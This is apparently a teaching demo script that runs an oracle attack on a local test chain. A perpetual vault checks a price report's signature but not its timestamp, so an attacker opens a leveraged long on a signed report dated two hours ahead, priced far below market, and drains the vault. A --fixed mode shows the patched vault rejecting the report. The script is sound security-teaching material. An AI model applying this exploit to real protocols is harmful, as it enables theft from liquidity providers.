// Attack #1: a price report from the future. Our perp vault checks the feed's signature but
// not the report's timestamp. A report dated +2h prices BTC at $5,000 (true price $62,000).
//   node demos/01-future.mjs           the vault accepts it; open at $5,000, close at $62,000
//   node demos/01-future.mjs --fixed   ts must be <= now and <= 60s old: reverts FutureReport
import { startChain, stopChains, roles, abis, signReport, units, fmt, usd, pct } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "future-fixed" : "future", fixed ? "Future report, fixed" : "Future report");
const C = await startChain();
const { admin, attacker, reporter } = roles;

const usdc = await C.deploy("TestToken", ["Test USDC", "tUSDC"]);
// --fixed only picks which vault is deployed.
const kind = fixed ? "PerpVaultFixed" : "PerpVault";
const vault = await C.deploy(kind, [usdc, reporter.address]);
await C.send(admin, usdc, abis.TestToken, "mint", [vault, units(240_000)]); // LP liquidity
await C.send(admin, usdc, abis.TestToken, "mint", [attacker.address, units(1_000)]);
await C.send(attacker, usdc, abis.TestToken, "approve", [vault, units(1_000)]);

const before = await C.balanceOf(usdc, vault);
const atkBefore = await C.balanceOf(usdc, attacker.address);
t.say(`vault holds ${fmt(before)} tUSDC (LP liquidity)`);

const now = await C.now();
const bad = await signReport(reporter, units(5_000), now + 7200n);
t.note(`signed report: BTC ${usd(bad.report.price, 0)} · ts = now + ${(bad.report.ts - now) / 3600n}h`);
t.cmd(`attacker → open(1,000 tUSDC, 5x long, that report)`);
const o = await C.attempt(attacker, vault, abis[kind], "open", [units(1_000), bad.report, bad.sig]);
const [, size, entry] = await C.read(vault, abis[kind], "positions", [attacker.address]);
if (o.ok) t.bad(`  ✓ opened ${fmt(size)} BTC at ${usd(entry, 0)}`);
else t.ok(`  ✗ reverted: ${o.name}`);

if (size > 0n) {
  const good = await signReport(reporter, units(62_000), await C.now());
  t.cmd(`attacker → close(fresh report: BTC ${usd(good.report.price, 0)})`);
  await C.send(attacker, vault, abis[kind], "close", [good.report, good.sig]);
}
// Every number below is read from balances after the transactions ran.
const after = await C.balanceOf(usdc, vault);
const gain = (await C.balanceOf(usdc, attacker.address)) - atkBefore;
t.say(`vault ${fmt(before)} → ${fmt(after)} (${pct(before, after)})`);
t.big(after < before ? `VAULT ${pct(before, after)} · ATTACKER +${fmt(gain)} tUSDC` : `VAULT UNCHANGED · ${fmt(after)} tUSDC`);
t.save(); stopChains(); process.exit(0);
